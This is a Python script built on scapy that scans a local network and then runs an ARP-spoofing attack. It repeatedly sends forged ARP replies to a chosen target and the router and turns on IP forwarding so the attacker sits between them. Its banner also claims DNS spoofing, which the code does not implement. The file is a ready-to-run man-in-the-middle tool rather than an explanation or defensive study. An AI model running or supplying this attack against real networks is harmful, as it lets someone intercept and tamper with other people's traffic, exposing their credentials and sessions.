#!/bin/python
import scapy.all as scapy
from colorama import Fore,Back,Style
import terminal_banner
from time import sleep
import os
import sys


class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   W  = '\033[0m'  # white (normal)
   R  = '\033[31m' # red
   G  = '\033[32m' # green
   O  = '\033[33m' # orange
   B  = '\033[34m' # blue
   P  = '\033[35m' # purple
   C  = '\033[36m' # cyan
   GR = '\033[37m' # gray
   T  = '\033[93m' # tan
   M = '\033[1;35;32m' # magenta


# targetIp_list = []  


def Scan(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	return answered_list

def Print(answered_list):
	print("\n\n  No \tIP\t\t\tMAC Adress\n-----------------------------------------------")	
	hostlist = 0
	for element in answered_list:
		print(" |" + str(hostlist) +"|  " + element[1].psrc +"\t\t" + element[1].hwsrc)
		# client_dict = {"ip":element[1].psrc ,"mac" : element[1].hwsrc}
		# targetIp_list.append(client_dict)
		hostlist +=1

def GetMac(ip):
	ModAnswer = Scan(ip)
	return ModAnswer[0][1].hwsrc

def Arp(targetIp,targetMac,routerIP):
	packet = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=routerIP)
	scapy.send(packet,verbose=False)

def Ipforward():
	ipf = open('/proc/sys/net/ipv4/ip_forward','r+')
	ipf_read = ipf.read()
	if ipf_read != 1:
		ipf.write('1\n')
	else:
		ipf.close()

def Spoof():
	targetIp = input(color.DARKCYAN + "Enter target ip :")
	# targetIp = targetIp_list[targetNo]["ip"]
	targetMac = GetMac(targetIp)
	routerIP = input(color.P + "Enter the router Ip :")
	routerMac = GetMac(routerIP)
	Ipforward()
	print(color.P + "\n[!] Exit the program CTRL + c")
	send_packet_count = 0
	try:
		while True:
			Arp(targetIp,targetMac,routerIP)
			Arp(routerIP,routerMac,targetIp)
			send_packet_count += 2
			print(color.BLUE + "\r[+] Packet Send :" + str(send_packet_count),end="")
			sys.stdout.flush()
			sleep(2)
	except KeyboardInterrupt:
		print(color.P + "\n[!] ARP Request is stoped")
	
def main():
	if os.geteuid() != 0:
		sys.exit(Back.RED + color.G + "\n[!] Please run as root" + Back.RESET)
	print(color.HEADER +"")
	banner_text ="\t\tThis Project is working Arp spoof and dns spoof \n\n \t\t\tAuther : name \n"
	print(terminal_banner.Banner(banner_text))
	
	sleep(0.1)
	while True:
		print(color.GREEN   + "\n\n\t 1. for Scan the network")
		sleep(0.1)
		print(color.YELLOW + "\t 2. for arp spoof ")
		sleep(0.1)
		print(color.RED +"\t 3. for Exit the Program")
		sleep(0.2)
		choices = int(input(color.M + "Enter you Choices:"))

		if choices == 1:
			sleep(0.1)
			network_ip = input(color.BLUE + "\nEnter the Network address (exmple: 192.168.0.1/24) :")
			Print(Scan(network_ip))
		elif choices ==2:
			Spoof()
			# if len(targetIp_list) < 1:
			# 	print( Style.NORMAL + '' + color.RED + "\n\t[ Places make a scan your Network First,Choices 1 option first ] \n\n")
			# else:
			# 	Spoof()
		elif choices ==3:
			exit()

if __name__ == '__main__':
	main()

	